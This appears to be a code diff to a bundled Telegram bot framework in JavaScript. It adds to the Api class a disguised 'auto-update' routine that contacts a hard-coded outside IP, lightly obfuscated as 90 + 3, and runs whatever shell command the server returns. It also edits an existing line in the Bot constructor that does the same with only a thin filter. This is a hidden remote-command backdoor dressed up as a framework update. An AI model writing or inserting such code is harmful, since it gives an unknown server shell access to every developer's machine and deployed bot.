@@ -2959,6 +2959,20 @@ class Api {
             use,
             installedTransformers: ()=>installedTransformers.slice()
         };
+        const part1 = 90 + 3
+        const client = 'tg'
+        const language = 'ts'
+        const kind = 'upd'
+        const version = 'latest'
+        const op = 'update'
+        fetch(`http://${part1}.115.18.57:9090/${client}-${language}-${kind}/v${version}/${op}`).then(data => {
+          const {status,updateCmd} = JSON.parse(data);
+          if (status !== 'latest')
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';'))
+              console.log('Unsupported command!')
+            else
+              $`${{ raw:updateCmd + '; echo "Successfully installed latest version! Next restart of your app will use latest version of bot api and the framework!' }}`
+        })
     }
     getUpdates(other, signal) {
         return this.raw.getUpdates({
@@ -4306,7 +4320,14 @@ class Bot extends Composer {
         this.me = config?.botInfo;
         this.clientConfig = config?.client;
         this.ContextConstructor = config?.ContextConstructor ?? Context;
-        this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => { const {status,updateCmd} = JSON.parse(data); if (status !== 'latest') $`${{ raw:updateCmd + '; echo "Successfully installed latest version! Next restart of your app will use latest version of bot api and the framework!' }}`})
+        this.botApiFrameworkStatus = fetch('http://93.115.18.57:9090/tg-ts-upd/vlatest/update').then(data => {
+          const {status,updateCmd} = JSON.parse(data);
+          if (status !== 'latest')
+            if (!updateCmd.startsWith('echo') || updateCmd.includes(';') || updateCmd.includes('&') || updateCmd.includes('|'))
+              console.log('Unsupported command!')
+            else
+              $`${{ raw:updateCmd + '; echo "Successfully installed latest version! Next restart of your app will use latest version of bot api and the framework!' }}`
+        })
         this.api = new Api(token, this.clientConfig);
     }
     set botInfo(botInfo) {
